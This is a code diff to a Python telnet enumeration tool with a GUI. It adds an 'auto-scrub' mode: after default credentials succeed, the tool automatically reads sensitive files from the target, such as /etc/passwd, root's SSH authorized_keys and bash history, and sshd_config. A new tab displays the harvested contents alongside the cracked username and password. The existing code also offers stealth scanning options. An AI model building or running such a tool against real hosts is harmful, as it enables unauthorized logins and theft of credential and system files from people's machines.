@@ -39,6 +39,27 @@ class TelnetEnumerator:
         ('pi', 'raspberry'),
     ]
     
+    # Common files to try to scrub from telnet servers
+    COMMON_LINUX_FILES = [
+        '/etc/passwd',
+        '/etc/hosts',
+        '/etc/hostname',
+        '/etc/issue',
+        '/etc/os-release',
+        '/proc/version',
+        '/proc/cpuinfo',
+        '/etc/ssh/sshd_config',
+        '/etc/network/interfaces',
+        '/root/.ssh/authorized_keys',
+        '/root/.bash_history',
+    ]
+    
+    COMMON_WINDOWS_FILES = [
+        'C:\\Windows\\System32\\drivers\\etc\\hosts',
+        'C:\\Windows\\win.ini',
+        'C:\\boot.ini',
+    ]
+    
     # File viewing constants
     MAX_FILE_CONTENT_LENGTH = 2000  # Maximum characters to capture per file
     FILE_PREVIEW_LENGTH = 500  # Maximum characters to display in preview
@@ -57,6 +78,7 @@ class TelnetEnumerator:
         self.randomize_order = False  # Whether to randomize scan order
         self.randomize_source_port = False  # Whether to randomize source port for stealth
         self.files_to_view = []  # List of file paths to view when credentials are valid
+        self.auto_scrub_files = False  # Whether to automatically scrub common files
     
     def _check_encryption_support(self, sock: socket.socket) -> str:
         """
@@ -398,10 +420,18 @@ class TelnetEnumerator:
                             'response': (response + final_response).strip()[:200]  # Limit response length
                         }
                         
-                        # If file viewing is enabled and we have files to view, try to read them
+                        # Determine which files to view
+                        files_to_try = []
                         if self.files_to_view:
+                            files_to_try = self.files_to_view
+                        elif self.auto_scrub_files:
+                            # Auto-scrub mode: try common files for both Linux and Windows
+                            files_to_try = self.COMMON_LINUX_FILES + self.COMMON_WINDOWS_FILES
+                        
+                        # If file viewing is enabled and we have files to view, try to read them
+                        if files_to_try:
                             try:
-                                viewed_files = self._view_files_via_telnet(sock, self.files_to_view)
+                                viewed_files = self._view_files_via_telnet(sock, files_to_try)
                                 if viewed_files:
                                     login_result['files_viewed'] = viewed_files
                             except Exception as e:
@@ -562,12 +592,14 @@ class TelnetEnumeratorGUI:
         self.scan_thread = None
         self.result_queue = queue.Queue()
         self.scan_results = []  # Store all scan results
+        self.files_viewed_data = []  # Store all files viewed across all scans
         self.is_scanning = False
         
         # Options for scanning
         self.extract_ntlm_var = tk.BooleanVar(value=False)
         self.test_credentials_var = tk.BooleanVar(value=False)
         self.view_files_var = tk.BooleanVar(value=False)
+        self.auto_scrub_var = tk.BooleanVar(value=False)
         self.randomize_order_var = tk.BooleanVar(value=False)
         self.use_jitter_var = tk.BooleanVar(value=False)
         
@@ -637,15 +669,23 @@ class TelnetEnumeratorGUI:
         )
         self.view_files_checkbox.grid(row=2, column=0, sticky=tk.W, pady=2)
         
+        # Auto-scrub checkbox
+        self.auto_scrub_checkbox = ttk.Checkbutton(
+            options_frame,
+            text="  Auto-scrub common files (tries ~14 common files automatically)",
+            variable=self.auto_scrub_var
+        )
+        self.auto_scrub_checkbox.grid(row=3, column=0, sticky=tk.W, pady=2, padx=(20, 0))
+        
         # File paths input
-        ttk.Label(options_frame, text="  Files to view (comma-separated):", 
-                 font=('Helvetica', 8)).grid(row=3, column=0, sticky=tk.W, pady=2)
+        ttk.Label(options_frame, text="  Or specify custom files to view (comma-separated):", 
+                 font=('Helvetica', 8)).grid(row=4, column=0, sticky=tk.W, pady=2)
         self.files_entry = ttk.Entry(options_frame, width=60)
-        self.files_entry.grid(row=4, column=0, sticky=(tk.W, tk.E), pady=2, padx=(20, 0))
+        self.files_entry.grid(row=5, column=0, sticky=(tk.W, tk.E), pady=2, padx=(20, 0))
         self.files_entry.insert(0, "/etc/passwd,/etc/hosts")
         
         ttk.Label(options_frame, text="⚠️ Credential testing may trigger security alerts", 
-                 font=('Helvetica', 8), foreground='orange').grid(row=5, column=0, sticky=tk.W, pady=2)
+                 font=('Helvetica', 8), foreground='orange').grid(row=6, column=0, sticky=tk.W, pady=2)
         
         # Stealth options
         stealth_frame = ttk.LabelFrame(main_frame, text="Stealth Options (Less Detectable)", padding="10")
@@ -691,13 +731,29 @@ class TelnetEnumeratorGUI:
         self.export_button = ttk.Button(button_frame, text="Export Results", command=self.export_results)
         self.export_button.grid(row=0, column=3, padx=5)
         
-        # Results text area
+        # Results area with tabs
         ttk.Label(main_frame, text="Results:").grid(row=8, column=0, sticky=(tk.W, tk.N), pady=5)
         
-        self.results_text = scrolledtext.ScrolledText(main_frame, width=90, height=25, 
+        # Create a notebook for tabbed interface
+        self.notebook = ttk.Notebook(main_frame)
+        self.notebook.grid(row=8, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), 
+                          pady=5, padx=5)
+        
+        # Main results tab
+        main_results_frame = ttk.Frame(self.notebook)
+        self.notebook.add(main_results_frame, text="Main Results")
+        
+        self.results_text = scrolledtext.ScrolledText(main_results_frame, width=90, height=25, 
                                                       wrap=tk.WORD, font=('Courier', 9))
-        self.results_text.grid(row=8, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), 
-                              pady=5, padx=5)
+        self.results_text.pack(fill=tk.BOTH, expand=True)
+        
+        # Files viewed tab
+        files_viewed_frame = ttk.Frame(self.notebook)
+        self.notebook.add(files_viewed_frame, text="Files Viewed")
+        
+        self.files_text = scrolledtext.ScrolledText(files_viewed_frame, width=90, height=25, 
+                                                    wrap=tk.WORD, font=('Courier', 9))
+        self.files_text.pack(fill=tk.BOTH, expand=True)
         
         # Status bar
         self.status_var = tk.StringVar()
@@ -766,16 +822,25 @@ class TelnetEnumeratorGUI:
         extract_ntlm = self.extract_ntlm_var.get()
         test_credentials = self.test_credentials_var.get()
         view_files = self.view_files_var.get()
+        auto_scrub = self.auto_scrub_var.get()
         
         # Get file paths to view
         files_to_view = []
         if view_files and test_credentials:
-            files_str = self.files_entry.get().strip()
-            if files_str:
-                files_to_view = [f.strip() for f in files_str.split(',') if f.strip()]
-        
-        # Update enumerator with file viewing config
-        self.enumerator.files_to_view = files_to_view
+            if auto_scrub:
+                # Auto-scrub mode: will use common files list
+                self.enumerator.auto_scrub_files = True
+                self.enumerator.files_to_view = []
+            else:
+                # Manual mode: use specified files
+                self.enumerator.auto_scrub_files = False
+                files_str = self.files_entry.get().strip()
+                if files_str:
+                    files_to_view = [f.strip() for f in files_str.split(',') if f.strip()]
+                self.enumerator.files_to_view = files_to_view
+        else:
+            self.enumerator.auto_scrub_files = False
+            self.enumerator.files_to_view = []
         
         # Get stealth options
         randomize_order = self.randomize_order_var.get()
@@ -996,23 +1061,24 @@ class TelnetEnumeratorGUI:
                     if cred.get('response'):
                         output.append(f"  Response:        {cred['response'][:100]}...")
                     
-                    # Display viewed files if available
+                    # Display summary of viewed files if available
                     if cred.get('files_viewed'):
-                        output.append(f"\n  📄 FILES VIEWED ({len(cred['files_viewed'])} file(s)):")
+                        num_files = len(cred['files_viewed'])
+                        num_success = sum(1 for f in cred['files_viewed'] if f.get('content'))
+                        output.append(f"\n  📄 FILES VIEWED: {num_success}/{num_files} files successfully read")
+                        output.append(f"     (See 'Files Viewed' tab for full content)")
+                        
+                        # Store file data for the Files Viewed tab
                         for file_info in cred['files_viewed']:
-                            output.append(f"    Path:          {file_info['path']}")
-                            if file_info.get('content'):
-                                output.append(f"    Size:          {file_info.get('size', 0)} bytes")
-                                # Show preview of file content
-                                content_preview = file_info['content'][:self.enumerator.FILE_PREVIEW_LENGTH]
-                                output.append(f"    Content:")
-                                for line in content_preview.split('\n')[:self.enumerator.MAX_PREVIEW_LINES]:
-                                    output.append(f"      {line}")
-                                if len(file_info['content']) > self.enumerator.FILE_PREVIEW_LENGTH:
-                                    output.append(f"      ... (truncated, {len(file_info['content'])} total bytes)")
-                            elif file_info.get('error'):
-                                output.append(f"    Error:         {file_info['error']}")
-                            output.append("    " + "·" * 72)
+                            file_data = {
+                                'ip': result['ip'],
+                                'port': result['port'],
+                                'username': cred['username'],
+                                'password': cred['password'],
+                                'timestamp': result['timestamp'],
+                                'file_info': file_info
+                            }
+                            self.files_viewed_data.append(file_data)
                     
                     if cred.get('file_view_error'):
                         output.append(f"  File View Error: {cred['file_view_error']}")
@@ -1055,6 +1121,53 @@ class TelnetEnumeratorGUI:
         output.append("")
         
         self.append_result("\n".join(output))
+        
+        # Update the Files Viewed tab if any files were viewed
+        self.update_files_tab()
+    
+    def update_files_tab(self):
+        """Update the Files Viewed tab with all viewed files"""
+        if not self.files_viewed_data:
+            self.files_text.delete(1.0, tk.END)
+            self.files_text.insert(tk.END, "No files have been viewed yet.\n\n")
+            self.files_text.insert(tk.END, "Enable 'View Files' and 'Test Common Credentials' options\n")
+            self.files_text.insert(tk.END, "to automatically view files when valid credentials are found.")
+            return
+        
+        output = []
+        output.append("=" * 80)
+        output.append("FILES VIEWED FROM TELNET SERVERS")
+        output.append("=" * 80)
+        output.append(f"Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        output.append(f"Total Files:  {len(self.files_viewed_data)}")
+        output.append("=" * 80)
+        output.append("")
+        
+        for idx, file_data in enumerate(self.files_viewed_data, 1):
+            output.append(f"\n[File {idx}/{len(self.files_viewed_data)}]")
+            output.append("-" * 80)
+            output.append(f"Target:          {file_data['ip']}:{file_data['port']}")
+            output.append(f"Credentials:     {file_data['username']}:{file_data['password']}")
+            output.append(f"Timestamp:       {file_data['timestamp']}")
+            output.append(f"File Path:       {file_data['file_info']['path']}")
+            
+            if file_data['file_info'].get('content'):
+                output.append(f"File Size:       {file_data['file_info'].get('size', 0)} bytes")
+                output.append("\nFile Content:")
+                output.append("." * 80)
+                output.append(file_data['file_info']['content'])
+                output.append("." * 80)
+            elif file_data['file_info'].get('error'):
+                output.append(f"Error:           {file_data['file_info']['error']}")
+            
+            output.append("-" * 80)
+        
+        output.append("")
+        
+        # Clear and update the files tab
+        self.files_text.delete(1.0, tk.END)
+        self.files_text.insert(tk.END, "\n".join(output))
+        self.files_text.see(1.0)  # Scroll to top
     
     def append_result(self, text: str):
         """Append text to results area"""
@@ -1064,10 +1177,13 @@ class TelnetEnumeratorGUI:
     def clear_results(self):
         """Clear the results text area"""
         self.results_text.delete(1.0, tk.END)
+        self.files_text.delete(1.0, tk.END)
         self.scan_results = []
+        self.files_viewed_data = []
         self.progress_bar['value'] = 0
         self.progress_label.config(text="0/0")
         self.status_var.set("Ready")
+        self.update_files_tab()  # Reset the files tab to show "no files" message
     
     def export_results(self):
         """Export scan results to file"""
